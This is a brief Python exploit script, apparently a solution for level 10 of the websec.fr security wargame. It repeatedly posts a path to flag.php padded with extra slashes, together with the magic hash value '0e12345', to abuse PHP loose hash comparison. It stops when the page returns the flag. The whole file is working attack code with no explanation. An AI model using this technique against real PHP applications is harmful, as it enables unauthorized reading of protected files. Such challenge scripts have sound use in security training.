from requests import *
import time

webshell = 'level10'

def exploit():
    url = 'https://websec.fr/level10/index.php'


    current_addition="."+"/"
    while True:
        r=post(url,data={
            'f': f'{current_addition}flag.php',
            'hash':"0e12345"
            })
        print (f'[*] {current_addition}flag.php')
        current_addition+="/"
        if 'WEBSEC' in r.text:
            print(r.text)
            break

    



def main():

    exploit()



if __name__ == '__main__':
    main()
